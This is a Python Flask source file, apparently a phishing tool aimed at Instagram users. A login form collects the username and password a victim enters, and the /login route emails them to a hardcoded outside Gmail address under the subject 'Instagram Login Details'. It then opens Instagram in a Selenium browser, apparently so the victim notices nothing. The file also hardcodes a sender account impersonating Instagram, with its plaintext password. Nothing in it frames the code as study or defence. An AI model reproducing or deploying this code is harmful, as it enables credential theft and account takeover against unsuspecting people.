from flask import Flask, render_template, request
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

app = Flask(__name__)

class INSTAGRAM:
    def __init__(self, driver_path='driver.exe'):
        self.driver_op = webdriver.ChromeOptions()
        self.driver_op.add_argument('--start-maximized')
        self.driver_op.add_argument('--disable-extensions')
        self.driver = webdriver.Chrome(driver_path, options=self.driver_op)

    def open(self):
        self.driver.get('https://www.instagram.com/?hl=es')
        time.sleep(2)
        WebDriverWait(self.driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '//button[contains(text(), "Aceptar todo")]'))
        ).click()

    def login(self):
        time.sleep(2)
        WebDriverWait(self.driver, 10).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, 'input[name="username"]'))
        )
        WebDriverWait(self.driver, 10).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, 'input[name="password"]'))
        )
        print("رجاءً أدخل اسم المستخدم وكلمة المرور في الحقول ثم اضغط زر تسجيل الدخول.")
        WebDriverWait(self.driver, 600).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']"))
        ).click()
        time.sleep(3)

def send_email(username, password):
    from_email = 'admin.instagram@gmail.com'  # استبدل بهذا البريد الإلكتروني
    from_password = 'lahrour_1902'  # استبدل بكلمة مرور البريد الإلكتروني
    to_email = 'lahrour269@gmail.com'

    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = 'Instagram Login Details'

    body = f"Username: {username}\nPassword: {password}"
    msg.attach(MIMEText(body, 'plain'))

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, from_password)
    text = msg.as_string()
    server.sendmail(from_email, to_email, text)
    server.quit()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    # إرسال البريد الإلكتروني بالبيانات المدخلة
    send_email(username, password)
    insta_bot = INSTAGRAM()
    insta_bot.open()
    insta_bot.login()
    return "تم تسجيل الدخول بنجاح وتم إرسال البيانات إلى البريد الإلكتروني"

if __name__ == "__main__":
    app.run(debug=True)